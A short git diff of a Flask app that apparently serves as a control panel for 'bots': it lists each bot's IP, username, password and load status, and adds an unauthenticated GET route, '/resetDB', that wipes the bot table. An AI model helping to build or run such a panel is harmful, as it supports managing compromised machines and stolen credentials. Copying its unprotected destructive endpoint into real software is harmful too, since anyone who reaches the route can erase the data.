@@ -14,7 +14,9 @@ def page_not_found(e):
 
 @app.route('/')
 def index():
-    return('index')
+    bots = getBots().get_json()
+    heads = ["botId","ip","username","password","loaded","directoryName"]
+    return render_template('index.html',bots=list(bots.values()),heads=heads)
 
 @app.route('/login')
 def loginPage():
@@ -80,6 +82,13 @@ def removeBot(ip):
     else:
         return jsonify({'code':200,"data":"ip not found"})
 
+### =========================================================================================================
+###  remove all Bots
+### =========================================================================================================
+@app.route('/resetDB', methods=['GET'])
+def resetDB():
+    bots_table.remove({})
+    return jsonify({'code':200})
 
 
 ### =========================================================================================================
